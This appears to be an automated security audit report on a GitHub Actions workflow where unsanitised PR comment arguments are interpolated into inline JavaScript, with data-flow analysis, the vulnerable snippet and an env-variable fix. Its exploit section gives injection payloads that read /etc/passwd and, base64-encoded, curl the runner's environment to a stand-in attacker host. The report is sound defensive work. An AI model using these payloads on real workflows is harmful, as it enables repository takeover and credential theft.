# 🔒 CodeMender Security Report

*Generated: 2026-10-14 18:06:28 UTC*

## Summary

**Total findings: 1**

| Severity | Count |
|----------|-------|
| 🔴 CRITICAL | 1 |

| Status | Count |
|--------|-------|
| 🔴 OPEN | 1 |

## Findings

| ID | Severity | Confidence | Status | Fix | File | Title |
|----|----------|------------|--------|-----|------|-------|
| `250b8fe1` | 🔴 CRITICAL | 100% | OPEN | — | `.github/workflows/codemender-chatops.yml` | GitHub Actions Inline Script Code Injection via Untrusted PR Comment Inputs in actions/github-script |

## Details

### 1. 🔴 GitHub Actions Inline Script Code Injection via Untrusted PR Comment Inputs in actions/github-script (`250b8fe1`)

- **Severity**: 🔴 CRITICAL
- **Status**: OPEN
- **Type**: CODE INJECTION
- **File**: `.github/workflows/codemender-chatops.yml` (L250–365)
- **Confidence**: 100%

<details>
<summary>Analysis</summary>

An issue in `.github/workflows/codemender-chatops.yml` allows remote code execution (RCE) via GitHub Actions expression template injection in `actions/github-script@v7`.

### Data Flow Analysis
1. **Source**: An untrusted user creates or comments on any pull request with a command starting with `/find-diff`, `/verify`, or `/fix`. The comment body enters the workflow via `${{ github.event.comment.body }}` under the `issue_comment` trigger.
2. **Sanitization/Validation**: In the `execute-cmd` step (lines 75-88), `ARG2` is extracted from the comment body via `awk '{print $2}'` without character validation, filtering, or sanitization. For `/find-diff`, `DIFF_BASE` is set directly from `ARG2`. In lines 115-116, `finding_id` and `diff_base` are exported to `$GITHUB_OUTPUT`.
3. **Sink**: In the `Comment Results on Pull Request` step (lines 250-365), the workflow invokes `actions/github-script@v7` and interpolates `${{ steps.execute-cmd.outputs.finding_id }}` and `${{ steps.execute-cmd.outputs.diff_base }}` directly into inline JavaScript code (lines 257-258) wrapped in single quotes:
   ```javascript
   const findingId = '${{ steps.execute-cmd.outputs.finding_id }}';
   const diffBase = '${{ steps.execute-cmd.outputs.diff_base }}';
   ```
   Because GitHub Actions performs template expression interpolation before running the step, unescaped single quotes break out of the JavaScript string literal. Furthermore, the step runs unconditionally (`if: always()`), ensuring execution even if upstream Cloud Run or validation steps fail.

### Impact
The workflow executes with elevated permissions (`contents: write`, `pull-requests: write`, `id-token: write`) and has access to Google Cloud Workload Identity Federation credentials (`WIF_PROVIDER`, `WIF_SERVICE_ACCOUNT`) and `GITHUB_TOKEN`. Successful exploitation grants the attacker arbitrary code execution on the GitHub Actions runner, enabling repository compromise and cloud credential exfiltration.

### Conceptual Exploit Payload
An attacker comments on a pull request:
```text
/find-diff ';require('child_process').execSync('cat${IFS}/etc/passwd');//
```
or using Base64 encoding to avoid whitespace:
```text
/find-diff ';eval(Buffer.from('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdjdXJsIGh0dHBzOi8vYXR0YWNrZXIuY29tLyQoZW52fGJhc2U2NCknKTs=','base64').toString());//
```
When GitHub Actions renders the script before executing it with `node`:
```javascript
const diffBase = '';eval(Buffer.from('...','base64').toString());//';
```
The injected JavaScript executes in Node.js on the runner host with full access to the environment.

### Remediation
Do not interpolate `${{ ... }}` expressions directly in inline scripts. Pass untrusted outputs to environment variables under `env` and access them via `process.env`:
```yaml
- name: Comment Results on Pull Request
  if: always()
  uses: actions/github-script@v7
  env:
    DIFF_BASE: ${{ steps.execute-cmd.outputs.diff_base }}
    FINDING_ID: ${{ steps.execute-cmd.outputs.finding_id }}
    CMD_TYPE: ${{ steps.execute-cmd.outputs.cmd_type }}
  with:
    script: |
      const diffBase = process.env.DIFF_BASE;
      const findingId = process.env.FINDING_ID;
      const cmdType = process.env.CMD_TYPE;
```

</details>

<details>
<summary>Vulnerable Snippet</summary>

```
      - name: Comment Results on Pull Request
        if: always()
        uses: actions/github-script@v7
        with:
          script: |
            const fs = require('fs');
            const cmdType = '${{ steps.execute-cmd.outputs.cmd_type }}';
            const findingId = '${{ steps.execute-cmd.outputs.finding_id }}';
            const diffBase = '${{ steps.execute-cmd.outputs.diff_base }}';
            const logs = fs.existsSync('runner.log')
              ? fs.readFileSync('runner.log', 'utf8').slice(-60000)
              : 'Logs unavailable.';

            let body = '';

            if (cmdType === 'find-diff') {
              const jobStatus = '${{ job.status }}';
              let summarySection = '';

              if (fs.existsSync('findings.json')) {
                try {
                  const sarif = JSON.parse(fs.readFileSync('findings.json', 'utf8'));
                  const results = sarif.runs?.[0]?.results || [];
                  if (results.length === 0) {
                    summarySection = `✅ **No vulnerabilities found** against base \`${diffBase}\`.`;
                  } else {
                    const rows = results.map((r, idx) => {
                      const id = r.properties?.finding_id || r.properties?.id || String(idx);
                      const rule = r.ruleId || 'unknown';
                      const level = r.level || 'warning';
                      const loc = r.locations?.[0]?.physicalLocation;
                      const uri = loc?.artifactLocation?.uri || 'unknown';
                      const line = loc?.region?.startLine ? `:${loc.region.startLine}` : '';
                      const msg = (r.message?.text || '').split('\n')[0].replace(/\|/g, '\\|').slice(0, 100);
                      return `| \`${id}\` | \`${rule}\` | \`${level}\` | \`${uri}${line}\` | ${msg} |`;
                    }).join('\n');

                    summarySection = `⚠️ **Found ${results.length} finding(s)** against base \`${diffBase}\`.\n\n` +
                      `| ID | Rule | Level | Location | Summary |\n` +
                      `| :--- | :--- | :--- | :--- | :--- |\n` +
                      `${rows}\n\n` +
                      `💡 *Comment \`/verify <ID>\` or \`/fix <ID>\` to validate or remediate a finding.*`;
                  }
                } catch (err) {
                  summarySection = `⚠️ Could not parse \`findings.json\`: ${err.message}`;
                }
              } else if (jobStatus !== 'success') {
                summarySection = `❌ **Differential Scan Failed** against base \`${diffBase}\`. See Cloud Run logs below.`;
              } else {
                summarySection = `⚠️ Scan finished, but no \`findings.json\` artifact was found.`;
              }

              body = `### 🔎 CodeMender Cloud Run Diff Scan Results

            ${summarySection}

            <details>
            <summary>🔍 Click to expand Cloud Run execution logs (runner.log)</summary>

            \`\`\`text
            ${logs}
            \`\`\`

            </details>`;

            } else if (cmdType === 'verify') {
              let status = 'UNKNOWN';
              let reason = '';
              if (fs.existsSync('verified-finding.sarif')) {
                const sarif = JSON.parse(fs.readFileSync('verified-finding.sarif', 'utf8'));
                const props = sarif.runs?.[0]?.results?.[0]?.properties || {};
                status = props.status || 'OPEN';
                reason = props.dismiss_reason ? `\n\n**Dismiss Reason:** ${props.dismiss_reason}` : '';
              }

              body = `### 🧪 CodeMender Cloud Run Verification Results (\`${findingId}\`)

            **Verification Status:** \`${status}\`${reason}

            <details>
            <summary>🔍 Click to expand Cloud Run execution logs (runner.log)</summary>

            \`\`\`text
            ${logs}
            \`\`\`

            </details>`;

            } else if (cmdType === 'fix') {
              const jobStatus = '${{ job.status }}';
              const header = jobStatus === 'success'
                ? `✅ **Vulnerability Remediation Completed.** Patch for \`${findingId}\` applied and pushed to branch \`${{ steps.pr-metadata.outputs.branch }}\`.`
                : `❌ **Vulnerability Remediation Failed** for \`${findingId}\`. See Cloud Run logs below.`;

              body = `### 🩹 CodeMender Cloud Run Patch Results (\`${findingId}\`)

            ${header}

            <details>
            <summary>🛠️ Click to expand Cloud Run execution logs (runner.log)</summary>

            \`\`\`text
            ${logs}
            \`\`\`

            </details>`;
            }

            if (body) {
              await github.rest.issues.createComment({
                issue_number: context.issue.number,
                owner: context.repo.owner,
                repo: context.repo.repo,
                body: body
              });
            }
```

</details>

---


---
### 💬 CodeMender ChatOps Commands
Comment on this Pull Request using the Finding ID or Index below:
- **Verify exploitability:** `/verify <finding_id>`
- **Generate & commit fix:** `/fix <finding_id>`

| Index | Finding ID | Rule ID | Location | ChatOps Commands |
| :--- | :--- | :--- | :--- | :--- |
| `0` | `0` | `CODE INJECTION` | `.github/workflows/codemender-chatops.yml:250` | `/verify 0` <br> `/fix 0` |
